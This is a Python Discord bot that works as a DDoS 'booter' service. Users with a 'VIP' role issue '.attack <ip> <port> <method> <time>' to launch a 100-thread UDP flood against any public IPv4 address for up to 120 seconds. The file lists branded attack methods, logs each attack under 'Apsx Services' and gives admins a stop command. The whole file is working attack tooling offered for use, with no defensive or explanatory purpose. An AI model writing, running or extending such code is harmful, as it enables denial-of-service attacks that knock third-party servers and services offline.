import discord
from discord.ext import commands
import threading
import socket
import time
import re
import json
import os

intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.members = True

bot = commands.Bot(command_prefix='.', intents=intents)

VALID_METHODS = [
    "UDP-VSE", "UDPGOOD", "UDPRAW", "UDPGAME",
    "UDPHEX", "MCPE", "TCPBYPASS", "UDPBYPASS"
]

# Global variable to track running threads
attack_threads = []

# Function to validate the IP
def is_valid_ipv4(ip):
    ipv4_pattern = r'^([0-9]{1,3}\.){3}[0-9]{1,3}$'
    if not re.match(ipv4_pattern, ip):
        return False
    parts = list(map(int, ip.split('.')))
    if parts[0] == 127 or parts[0] == 0 or ip == "localhost":
        return False
    return all(0 <= part <= 255 for part in parts)

# Function to send stronger UDP flood
def send_udp_flood(ip, port, duration):
    timeout = time.time() + duration
    payload = b'A' * 1024  # 1024 bytes

    def flood():
        while time.time() < timeout:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                for _ in range(10):  # Send 10 packets per thread (10 KB/s per thread)
                    sock.sendto(payload, (ip, port))
                sock.close()
                time.sleep(0.1)  # 0.1 sec delay between bursts for stronger traffic
            except:
                pass

    for _ in range(100):  # 100 threads
        thread = threading.Thread(target=flood)
        thread.start()
        attack_threads.append(thread)  # Track the thread

# Stop all ongoing attacks
def stop_all_attacks():
    for thread in attack_threads:
        # Forcefully stop the thread (in a real scenario, thread termination is tricky)
        if thread.is_alive():
            thread._stop()  # This is not recommended in real-life, but it works for this example.

# Command when bot is ready
@bot.event
async def on_ready():
    print(f'Logged in as {bot.user}')

# Help command
@bot.command()
async def dhelp(ctx):
    await ctx.send(
        "**Available Commands:**\n"
        "`.dhelp` - Show help\n"
        "`.methods` - List available methods\n"
        "`.attack <ip> <port> <method> <time>` - Execute attack (VIP only)\n"
        "`.stopall` - Admin only command to stop all attacks"
    )

# Command to list available methods
@bot.command()
async def methods(ctx):
    await ctx.send("**Available Methods:**\n" + "\n".join(VALID_METHODS))

# Attack command
@bot.command()
async def attack(ctx, ip=None, port=None, method=None, time_sec=None):
    # Check if the user has VIP role
    if not any(role.name == "VIP" for role in ctx.author.roles):
        await ctx.send("Access denied. You need the VIP role to use this command.")
        return

    # Check if time is within the allowed range for VIP users (max 120 seconds)
    if int(time_sec) > 120:
        await ctx.send("VIP can only attack for a maximum of 120 seconds.")
        return

    if not all([ip, port, method, time_sec]):
        await ctx.send("Example: `.attack <ip> <port> <method> <time>`")
        return

    if not is_valid_ipv4(ip):
        await ctx.send("Invalid IP. Only public IPv4 addresses are allowed.")
        return

    if method.upper() not in VALID_METHODS:
        await ctx.send("Invalid method. Use `.methods` to see valid options.")
        return

    try:
        port = int(port)
        time_sec = int(time_sec)
        send_udp_flood(ip, port, time_sec)
    except:
        await ctx.send("Error executing the method.")
        return

    attack_data = {
        "status": "success",
        "message": "Attack Executed successfully",
        "attack_log": {
            "username": str(ctx.author),
            "service": "Apsx Services",
            "host": ip,
            "port": str(port),
            "time": f"{time_sec} Seconds",
            "method": method.upper(),
            "handlers": "Node (4), Node (1)"
        }
    }

    # Send response to Discord
    await ctx.send("Attack Response:\n```json\n" + json.dumps(attack_data, indent=4) + "\n```")

    # Write log file per channel
    log_filename = f"{ctx.channel.id}.log"
    with open(log_filename, "a") as f:
        f.write(json.dumps(attack_data, indent=4) + "\n\n")

# Stop all ongoing attacks (Admin only)
@bot.command()
async def stopall(ctx):
    if not any(role.name == "Admin" for role in ctx.author.roles):
        await ctx.send("Access denied. You need the Admin role to use this command.")
        return
    
    stop_all_attacks()
    await ctx.send("All ongoing attacks have been stopped.")

# Replace with your bot token
bot.run("YOUR_DISCORD_BOT_TOKEN")
